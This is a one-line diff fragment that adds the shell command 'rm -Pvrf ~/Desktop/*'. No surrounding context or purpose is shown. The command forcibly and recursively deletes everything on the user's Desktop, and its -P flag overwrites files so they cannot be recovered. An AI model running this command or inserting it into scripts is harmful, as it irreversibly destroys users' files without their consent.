@@ -1,0 +1,1 @@
+rm -Pvrf ~/Desktop/*
